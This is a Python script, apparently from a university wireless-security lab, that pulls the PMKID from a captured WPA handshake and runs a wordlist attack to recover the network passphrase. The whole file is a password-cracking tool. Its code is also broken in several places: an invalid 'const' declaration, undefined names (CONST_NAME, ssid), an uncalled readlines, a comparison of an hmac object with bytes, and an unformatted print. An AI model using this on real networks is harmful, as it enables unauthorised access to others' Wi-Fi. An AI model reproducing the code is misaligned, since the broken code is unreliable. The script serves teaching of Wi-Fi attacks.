#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

const PMK_NAME = b"PMK Name"

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.cap") 

assocRequests = []
# get info from first association request (ssid, APMac, ClientMAC)
def getAssocReqInfo(packets):
    for p in packets:
        if p.haslayer(Dot11): 
            if p.type == 0 and p.subtype == 0 :
                ar_ssid = p.info.decode('ascii')
                ar_APmac = p.addr1
                ar_Clientmac = p.addr2
                assocRequests.append((ar_ssid, ar_APmac, ar_Clientmac))

# get handshake messages
def getPMKIDFromFirstHandshakeMessage(packets, apmac, climac):
    for p in packets:
        #AP to STA (handshake#1 and handshake#3)
        if p.haslayer(WPA_key) and p.addr2 == apmac and p.addr1 ==climac:
            return getPMKIDFromPacket(p)

    # Return 0 if not found in the packets
    return 0
            


# On voit facilement sur Wireshark que la PMKID correspond à 16 Bytes avant les 4 derniers
def getPMKIDFromPacket(packet):
    return raw(packet)[-20:-4]


def attack(expected_pmkid, infos):
    words = open('superdico.txt', 'r').readlines
    
    for word in words:
        word = word.strip()
        passPhrase = str.encode(word)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)()
        computed_pmkid = hmac.new(pmk, CONST_NAME + infos[1] + infos[2], hashlib.sha1)

        if computed_pmkid == expected_pmkid:
            print("Found result with word {} on the network with SSID {}", word, infos[0]) 

    return


def main():    
    #Association Request Info
    getAssocReqInfo(wpa)
    for infos in assocRequests:
        pmkid = getPMKIDFromFirstHandshakeMessage(wpa, infos[1], infos[2])
        if pmkid != 0:
            attack(pmkid, infos)

if __name__ == "__main__":
    main()